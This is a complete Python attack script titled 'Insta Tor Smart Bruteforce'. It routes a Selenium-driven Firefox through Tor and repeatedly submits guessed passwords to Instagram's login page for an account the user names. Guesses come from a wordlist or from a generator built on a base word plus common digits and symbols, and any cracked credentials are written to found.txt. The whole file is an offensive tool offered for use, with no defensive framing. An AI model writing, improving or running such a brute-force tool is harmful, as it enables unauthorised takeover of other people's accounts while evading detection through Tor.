#!/usr/bin/env python3

import os
import time
import subprocess
import random
from rich.console import Console
from rich.prompt import Prompt
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By

console = Console()

# شعار
console.print("\n[bold red]██╗     ██╗   ██╗███████╗██╗   ██╗███╗   ██╗██╗██╗  ██╗[/]")
console.print("[bold red]██║     ██║   ██║██╔════╝██║   ██║████╗  ██║██║╚██╗██╔╝[/]")
console.print("[bold red]██║     ██║   ██║███████╗██║   ██║██╔██╗ ██║██║ ╚███╔╝ [/]")
console.print("[bold red]██║     ██║   ██║╚════██║██║   ██║██║╚██╗██║██║ ██╔██╗ [/]")
console.print("[bold red]███████╗╚██████╔╝███████║╚██████╔╝██║ ╚████║██║██╔╝ ██╗[/]")
console.print("[bold white]    Insta Tor Smart Bruteforce | by lveunix\n[/]")

# تثبيت الأدوات
console.print("[bold cyan]🔧 Checking dependencies...[/]")
deps = [
    ("tor", "sudo apt install tor -y"),
    ("firefox", "sudo apt install firefox-esr -y"),
    ("geckodriver", "sudo apt install geckodriver -y"),
]

for name, cmd in deps:
    if subprocess.run(["which", name], stdout=subprocess.DEVNULL).returncode != 0:
        console.print(f"[bold yellow]➕ Installing {name}...[/]")
        os.system(cmd)

try:
    import selenium
except ImportError:
    console.print("[bold yellow]➕ Installing selenium...[/]")
    os.system("pip install selenium")

# تشغيل Tor
console.print("[bold cyan]🧅 Starting Tor service...[/]")
os.system("sudo service tor start")
time.sleep(3)

# إعداد المتصفح عبر Tor
options = Options()
options.headless = False
options.set_preference('network.proxy.type', 1)
options.set_preference('network.proxy.socks', '127.0.0.1')
options.set_preference('network.proxy.socks_port', 9050)
options.set_preference("network.proxy.socks_remote_dns", True)

# بيانات المستخدم
username = Prompt.ask("[bold green]👤 Enter Instagram username")
mode = Prompt.ask("[bold cyan]🔧 Mode (1 = Wordlist file, 2 = Smart generator)", choices=["1", "2"])

# تحميل كلمات المرور
passwords = []

if mode == "1":
    wordlist_path = Prompt.ask("[bold cyan]📂 Enter wordlist path")
    if not os.path.isfile(wordlist_path):
        console.print("[bold red]❌ Wordlist not found.")
        exit()
    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]
else:
    base = Prompt.ask("[bold green]💡 Enter base word (e.g., username, name, date)")
    symbols = ['!', '@', '#', '$', '_', '']
    numbers = ['123', '1', '007', '2024', '321', '', '11', '777']

    def smart_gen(base_word):
        while True:
            word = (
                random.choice([base_word.lower(), base_word.title()]) +
                random.choice(numbers) +
                random.choice(symbols)
            )
            yield word if 6 <= len(word) <= 12 else None

    password_gen = smart_gen(base)

# فتح المتصفح
console.print("[bold blue]🌐 Launching Firefox with Tor...[/]")
driver = webdriver.Firefox(options=options)
driver.get("https://www.instagram.com/accounts/login/")
time.sleep(6)

# تخمين فعلي
def try_password(pwd):
    try:
        console.print(f"[bold cyan]🔁 Trying: [white]{pwd}")
        driver.get("https://www.instagram.com/accounts/login/")
        time.sleep(3)

        user_input = driver.find_element(By.NAME, "username")
        pass_input = driver.find_element(By.NAME, "password")
        login_btn = driver.find_element(By.XPATH, "//button[@type='submit']")

        user_input.clear()
        pass_input.clear()
        user_input.send_keys(username)
        pass_input.send_keys(pwd)
        login_btn.click()

        time.sleep(6)
        current_url = driver.current_url

        if "challenge" in current_url or "two_factor" in current_url:
            console.print(f"\n[bold green]✅ SUCCESS! Password is: [white]{pwd}")
            with open("found.txt", "w") as f:
                f.write(f"{username}:{pwd}\n")
            driver.quit()
            exit()

        elif "checkpoint" in current_url:
            console.print(f"\n[bold yellow]⚠️ Checkpoint hit! Possible password: {pwd}")
            driver.quit()
            exit()
        else:
            console.print("[bold red]❌ Wrong")

    except Exception as e:
        console.print(f"[bold red]⚠️ Error: {e}")
        time.sleep(5)

# حلقة التخمين
if mode == "1":
    for pwd in passwords:
        try_password(pwd)
else:
    for _ in range(1000000):  # لا نهائي عمليًا
        pwd = next(password_gen)
        if pwd:
            try_password(pwd)